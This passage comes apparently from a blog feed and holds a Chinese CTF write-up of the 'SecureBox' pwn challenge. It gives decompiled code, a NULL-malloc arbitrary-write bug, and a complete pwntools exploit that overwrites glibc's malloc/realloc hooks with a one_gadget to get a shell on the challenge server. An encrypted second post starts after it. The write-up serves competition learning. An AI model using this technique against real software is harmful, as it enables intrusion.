    <content type="html"><![CDATA[<p>太菜了，MarksMan没有做出来，本地打通了结果远程打不通。后面去做SecureBox，看到Glibc 2.30以为需要了解一些新机制了可能做起来会有些吃力，结果发现还挺简单的。</p><a id="more"></a><h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>x64，保护全开：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>常规菜单题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.Allocate</span><br><span class="line">2.Delete</span><br><span class="line">3.Enc</span><br><span class="line">4.Show</span><br><span class="line">5.Exit</span><br></pre></td></tr></table></figure><ul><li><code>Allocate</code>功能就是先malloc一块0x28的chunk，然后前0x10字节填充随机密钥，chunk[4]储存输入的size，chunk[3]储存根据输入的size来malloc的数据chunk：  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">Allocate</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _QWORD *v0; <span class="comment">// rbx</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+4h] [rbp-2Ch]</span></span><br><span class="line">    <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">    <span class="keyword">int</span> j; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 <span class="built_in">size</span>; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">    v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">    v2 = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !chunk_array[i] )</span><br><span class="line">        &#123;</span><br><span class="line">        v2 = i;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v2 == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"No boxes available!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Size: "</span>);</span><br><span class="line">        <span class="built_in">size</span> = choice();</span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">size</span> &gt; <span class="number">0x100</span> &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">size</span> &lt;= <span class="number">0xFFF</span> )  <span class="comment">// size can be very large</span></span><br><span class="line">        &#123;</span><br><span class="line">        chunk_array[v2] = <span class="built_in">malloc</span>(<span class="number">0x28</span>uLL);</span><br><span class="line">        *((_QWORD *)chunk_array[v2] + <span class="number">4</span>) = <span class="built_in">size</span>;  <span class="comment">// very large number</span></span><br><span class="line">        v0 = chunk_array[v2];</span><br><span class="line">        v0[<span class="number">3</span>] = <span class="built_in">malloc</span>(<span class="built_in">size</span>);     <span class="comment">// return 0 here</span></span><br><span class="line">        <span class="built_in">memset</span>(chunk_array[v2], <span class="number">0</span>, <span class="number">0x14</span>uLL);</span><br><span class="line">        read_rand_data(chunk_array[v2]);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Key: "</span>);</span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">15</span>; ++j )</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%02x "</span>, *((<span class="keyword">unsigned</span> __int8 *)chunk_array[v2] + j));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\nBox ID: %d\n"</span>, v2);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Finish!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><code>Delete</code>free得很彻底：  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">Delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v1; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">    v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Box ID: "</span>);</span><br><span class="line">    v1 = choice();</span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt; <span class="number">0xF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">    LABEL_7:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Finish!"</span>);</span><br><span class="line">        <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( chunk_array[v1] )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *((_QWORD *)chunk_array[v1] + <span class="number">3</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="built_in">free</span>(*((<span class="keyword">void</span> **)chunk_array[v1] + <span class="number">3</span>));</span><br><span class="line">        *((_QWORD *)chunk_array[v1] + <span class="number">3</span>) = <span class="number">0L</span>L;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">free</span>(chunk_array[v1]);</span><br><span class="line">        chunk_array[v1] = <span class="number">0L</span>L;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Empty Box!"</span>);</span><br><span class="line">    <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><code>Enc</code>功能对输入的<code>index</code>对应的chunk中储存的数据chunk进行编辑，逻辑为输入相应的<code>offset</code>，<code>length</code>，以及<code>data</code>，然后在数据chunk的对应的<code>offset</code>写入<code>length</code>长度的加密的<code>data</code>，这里的加密其实就是使用在<code>Allocate</code>功能中产生的随机0x10字节的密钥进行异或。  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">Enc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> __int64 i; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">    v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Box ID: "</span>);</span><br><span class="line">    v2 = choice();</span><br><span class="line">    <span class="keyword">if</span> ( v2 &gt; <span class="number">0xF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_9:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Finish!"</span>);</span><br><span class="line">        <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( chunk_array[v2] )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Offset of msg: "</span>);</span><br><span class="line">        v3 = choice();</span><br><span class="line">        <span class="keyword">if</span> ( *((_QWORD *)chunk_array[v2] + <span class="number">4</span>) &gt; v3 ) <span class="comment">// *((_QWORD *)chunk_array[v2] + 4) is large here</span></span><br><span class="line">        &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Len of msg: "</span>);</span><br><span class="line">        v4 = *((_QWORD *)chunk_array[v2] + <span class="number">4</span>) - v3;</span><br><span class="line">        v5 = choice();</span><br><span class="line">        <span class="keyword">if</span> ( v5 &lt;= v4 )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"Msg: "</span>);</span><br><span class="line">            read_data(*((_QWORD *)chunk_array[v2] + <span class="number">3</span>) + v3, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v5);</span><br><span class="line">            v6 = *((_QWORD *)chunk_array[v2] + <span class="number">3</span>) + v3;</span><br><span class="line">            <span class="keyword">for</span> ( i = <span class="number">0L</span>L; i &lt; v5; ++i )</span><br><span class="line">            *(_BYTE *)(v6 + i) ^= *((_BYTE *)chunk_array[v2] + (i &amp; <span class="number">0xF</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Empty Box!"</span>);</span><br><span class="line">    <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><code>Show</code>功能打印给定<code>index</code>对应chunk中的数据chunk中的数据，根据提供的<code>offset</code>和<code>length</code>。  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">Show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v0; <span class="comment">// ST10_8</span></span><br><span class="line">    <span class="keyword">void</span> *dest; <span class="comment">// ST20_8</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+0h] [rbp-30h]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 n; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">    v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Box ID: "</span>);</span><br><span class="line">    v3 = choice();</span><br><span class="line">    <span class="keyword">if</span> ( v3 &lt;= <span class="number">0xF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( chunk_array[v3] )</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Offset of msg: "</span>);</span><br><span class="line">        v4 = choice();</span><br><span class="line">        <span class="keyword">if</span> ( *((_QWORD *)chunk_array[v3] + <span class="number">4</span>) &gt; v4 )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"Len of msg: "</span>);</span><br><span class="line">            v0 = *((_QWORD *)chunk_array[v3] + <span class="number">4</span>) - v4;</span><br><span class="line">            n = choice();</span><br><span class="line">            <span class="keyword">if</span> ( n &lt;= v0 )</span><br><span class="line">            &#123;</span><br><span class="line">            dest = <span class="built_in">calloc</span>(n + <span class="number">32</span>, <span class="number">1u</span>LL);</span><br><span class="line">            <span class="built_in">memcpy</span>(dest, (<span class="keyword">const</span> <span class="keyword">void</span> *)(*((_QWORD *)chunk_array[v3] + <span class="number">3</span>) + v4), n);</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"Msg: "</span>);</span><br><span class="line">            <span class="built_in">puts</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)dest);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Empty Box!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><ul><li>先利用unsorted bin来leak出libc的地址。</li><li>之后关键利用点就在于：<ul><li><code>Allocate</code>功能：其中<code>Allocate</code>的对size的检查逻辑<code>if ( size &gt; 0x100 &amp;&amp; (unsigned int)size &lt;= 0xFFF )</code>使得size可以是形如<code>0x00FFFFFF00000000</code>的很大的数，而进行相应的malloc操作时，会因为size过大而返回NULL也就是0，但是并没有对malloc的结果进行检查。</li><li><code>Enc</code>功能：因为<code>*((_QWORD *)chunk_array[v2] + 4)</code>可以很大（就是输入的size）且<code>*((_QWORD *)chunk_array[v2] + 3)=0</code>（malloc返回的结果），加上没有对<code>*((_QWORD *)chunk_array[v2] + 3)</code>的检查，所以在控制offset为任意地址的情况下，即可以实现向任意地址写任意数据。</li></ul></li><li>根据上述漏洞，首先<code>Allocate</code>一个size为<code>0x00FFFFFF00000000</code>（覆盖所有地址均可）的chunk（返回0），记录生成的<code>key</code>。</li><li><code>Enc</code>前一步申请的chunk，<code>offset</code>设置为<code>__realloc_hook</code>的地址，length的值为0x10。</li><li>将<code>(libc_realloc + 10) &lt;&lt; 64) | one_gadget</code>用<code>key</code>加密（逐字节异或）得到payload，将payload作为输入的data，这样可以将<code>__malloc_hook</code>写入<code>__libc_realloc+10</code>，<code>__realloc_hook</code>写入<code>onegadget</code>，目的是调整栈以满足<code>[rsp]+0x70</code>的约束然后打<code>onegadget</code>。（这里这么做是因为直接改<code>__free_hook</code>为<code>system</code>打不通，直接改<code>__malloc_hook</code>也满足不了约束，所以用<code>__libc_realloc</code>来调整栈。）</li></ul><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'39.97.210.182'</span>, <span class="number">19806</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./chall_2"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc_64.so.6"</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"5.Exit"</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Size: "</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"5.Exit"</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Box ID: "</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, offset, length, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"5.Exit"</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Box ID: "</span>, str(index))</span><br><span class="line">    p.sendlineafter(<span class="string">"Offset of msg: "</span>, str(offset))</span><br><span class="line">    p.sendlineafter(<span class="string">"Len of msg: "</span>, str(length))</span><br><span class="line">    p.sendafter(<span class="string">"Msg: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">(index, offset, length)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"5.Exit"</span>, <span class="string">"4"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Box ID: "</span>, str(index))</span><br><span class="line">    p.sendlineafter(<span class="string">"Offset of msg: "</span>, str(offset))</span><br><span class="line">    p.sendlineafter(<span class="string">"Len of msg: "</span>, str(length))</span><br><span class="line">    p.recvuntil(<span class="string">"Msg: \n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span><span class="params">(content, key)</span>:</span></span><br><span class="line">    value = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        value |= ((content &amp; <span class="number">0xFF</span>) ^ key[i]) &lt;&lt; (i * <span class="number">8</span>)</span><br><span class="line">        content &gt;&gt;= <span class="number">8</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> p64(value &amp; <span class="number">0xFFFFFFFFFFFFFFFF</span>) + p64(value &gt;&gt; <span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">main_arena_offset = <span class="number">0x1eab80</span></span><br><span class="line">__malloc_hook_offset = libc.sym[<span class="string">"__malloc_hook"</span>]</span><br><span class="line">realloc_offset = libc.symbols[<span class="string">"realloc"</span>]</span><br><span class="line">one_gadget_offset = <span class="number">0x10afa9</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">add(<span class="number">0x508</span>) <span class="comment"># chunk 0</span></span><br><span class="line">add(<span class="number">0x108</span>) <span class="comment"># chunk 0</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x508</span>) <span class="comment"># chunk 0</span></span><br><span class="line">view(<span class="number">0</span>, <span class="number">0</span>, <span class="number">8</span>)</span><br><span class="line">main_arena = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">libc_base = main_arena - main_arena_offset - <span class="number">0x60</span></span><br><span class="line">libc_realloc = libc_base + realloc_offset</span><br><span class="line">__malloc_hook = libc_base + __malloc_hook_offset</span><br><span class="line">one_gadget = libc_base + one_gadget_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># larget size</span></span><br><span class="line">add(<span class="number">0xFFFFFF00000000</span>) <span class="comment"># chunk 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># write __malloc_hook</span></span><br><span class="line">p.recvuntil(<span class="string">"Key: "</span>)</span><br><span class="line">keys = p.recv(<span class="number">48</span>)</span><br><span class="line">key = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(keys), <span class="number">3</span>):</span><br><span class="line">    print(keys[i:i+<span class="number">3</span>])</span><br><span class="line">    key.append(int(keys[i:i+<span class="number">3</span>], <span class="number">16</span>))</span><br><span class="line">edit(<span class="number">2</span>, str(__malloc_hook - <span class="number">8</span>), <span class="number">16</span>, enc(((libc_realloc + <span class="number">10</span>) &lt;&lt; <span class="number">64</span>) | one_gadget, key))</span><br><span class="line"></span><br><span class="line"><span class="comment"># __malloc_hook</span></span><br><span class="line">add(<span class="number">0x108</span>)</span><br><span class="line"></span><br><span class="line">success(key)</span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"libc_realloc: "</span> + hex(libc_realloc))</span><br><span class="line">success(<span class="string">"__malloc_hook: "</span> + hex(__malloc_hook))</span><br><span class="line">success(<span class="string">"one_gadget: "</span> + hex(one_gadget))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h1><p><code>flag{4b03fb45856021f3415e6451f6cf855d}</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;太菜了，MarksMan没有做出来，本地打通了结果远程打不通。后面去做SecureBox，看到Glibc 2.30以为需要了解一些新机制了可能做起来会有些吃力，结果发现还挺简单的。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Competition" scheme="https://n0nop.github.io/categories/Competition/"/>
    
    
      <category term="CTF" scheme="https://n0nop.github.io/tags/CTF/"/>
    
      <category term="pwn" scheme="https://n0nop.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwn rop: unexploitable</title>
    <link href="https://n0nop.github.io/2020/04/17/pwn-rop-unexploitable/"/>
    <id>https://n0nop.github.io/2020/04/17/pwn-rop-unexploitable/</id>
    <published>2020-04-17T15:49:50.000Z</published>
    <updated>2020-04-17T16:25:53.199Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Input password</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="5d3a78db7c708e1ce4180eb585a0da962673d55282d2cb8b1b9f3501326392c2">38bf8027d912094e8938c5662d33e384a0f4d8f5ffa6b6d9ee515bf7a8e8b4b8c26bd69bd9221b532ff090f710d592fabc35f59964522c3e212cb2bbb02c98a0bf189a0778905ab758d87ac0a88397599cf5ce11655907570f46cdbd223bd0cc8d3835095b039612b260a493c53057ebc13e232a8e3bab8148b438a3eb3633d869bfad2d2891fcbd3afb11c23e464801811587d58011922eb61a035edf3cce376451c9c4ade4bb90e2919b15c78d1f516767ed4c933249effbc21e641aa1f2e6b80fbe7714a3205f4ec0379a6808abcbb3390592bbb52fe32645786dfdea0b058c68e9b7488d8b6fbaf8438eecf51ec4a24e54d7f07ed5a50d76fdae7c2a883319a0d342b44e748e0f5225e4165c67366ccada07c1e3b779e8f0b742a90872838bffbad99947a061b9fff7f122507ed709d1d12e72057ef6d70295e31491aaa119fbabb83a75b6d5a17d0ca1b81fff624339990a5a4f23e1f0eb9aeb13924030f3dc4c58ec2aef0e86fe35694257dbfd661cebea152496d163124af146d8650d026e2d570c3d16b173f9e8b7f9d4e8f8794f09b28b2b4aca9646539583a09e82123462f838012b89105c73128fe1f67d38fc288979ac0c4cab86f2550cd18cd3144fd91808ce3e4528f4e26fb39b0b67d0f109ea8d039b39f5b4cb658f24e1a1e60b27809f2190b1047310f51dbdc42da0dfe40efc774da8a29a50655477a9fc3813de3d2dd506b46f71d521d935fe1bb954f5d099161ec927e4ea4447646ff6d04db874f05e1ff075752fe52212a9eaa04dee14d0453bb2b9b62e7c1dcb642d5a3ec97b5b126fdd29029c79cde8ff02bb406b5b1ba08d71ec1aa6d20bef3312efa5b9f1323e726de978fdca552671e461ab10646ec6cce4b47c9c29b0880e3fb6e583b637cbf458a624ba898652a2ff2735b04f5b3784dc229677be17246ce7387e444bd2f7cd26f88c7e9d0008ef800f1597225820f0bda043055f8933be9e91bfadf239b348bf79aa4ac35c6dfd07ecf62a2a25b24215134ad7640d764c516d8e6bac2ce90daffd49edd69ba83cc6fade233b2345664ecb78f856cd9c995f774cd24a4ba796cb2a59eb8960c1c2db065b6a63bc1457d9f11ecead7b6a661a34d12a2aacbb1e26dfca209dfc4c92bd81b6031fbedf3ee819ce82b90a55ad126bb6daf3ef08697921a114934a3844d8db64985ef61a1469ebbaec30d6d9823baed16f50255456b2835dd55038ed2e94ec592490d60f1d540f8974ebe587efa6a23684d38cf2be3cf9f48412d43ee9c1254267f1fe571772d880b0e5f3aba05c901a8d3baaaaddab07b92bcde68666b91a9068e2f72b6aca9bb2a7bd1ae94ce7728900173e399cd61